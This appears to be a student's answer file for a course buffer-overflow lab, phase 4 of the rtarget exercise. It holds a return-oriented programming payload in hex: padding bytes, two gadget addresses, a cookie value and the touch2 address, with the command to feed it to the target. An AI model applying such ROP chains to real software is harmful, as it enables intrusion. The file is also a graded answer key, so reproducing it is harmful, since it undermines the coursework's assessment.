/*

   To run the solution, move all the byte code into the .txt file,
   and remove all the comments.
   then run:

   ./hex2raw -i [TXT_FILE] | ./rtarget -q

*/

/* To fill the gap: */
12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90

/* Gadget 1 Address */
cc 19 40 00 00 00 00 00

/* Cookie to pass on stack to pop it by instruction Gadget 1 address */
fa 97 b9 59 00 00 00 00

/* Gadget 2 Address to mov cookie in %rdi, and return*/
a2 19 40 00 00 00 00 00

/* touch2 function's address to which Gadget 2 will return to*/
ec 17 40 00 00 00 00 00